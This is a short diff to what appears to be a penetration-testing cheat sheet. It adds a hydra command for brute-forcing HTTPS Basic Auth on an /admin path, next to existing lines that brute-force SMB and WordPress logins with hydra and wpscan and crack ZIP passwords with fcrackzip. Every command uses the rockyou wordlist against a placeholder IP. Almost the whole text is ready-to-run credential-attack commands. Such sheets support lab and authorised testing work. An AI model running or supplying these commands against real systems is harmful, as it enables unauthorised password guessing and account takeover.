@@ -22,6 +22,9 @@ hydra -t 1 -V -f -l user -P /usr/share/wordlists/rockyou.txt 10.10.10.10 smb
 # Bruteforce ZIP files using wordlist
 fcrackzip -v -b -D -p /usr/share/wordlists/rockyou.txt -u file.zip
 
+# Bruteforce HTTPS Basic Auth login using wordlist
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.10 https-get /admin
+
 # Bruteforce Wordpress login using wordlist
 hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.10 -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
 wpscan -u 10.10.10.10 --wordlist /usr/share/wordlists/dirb/others/best1050.txt --username admin
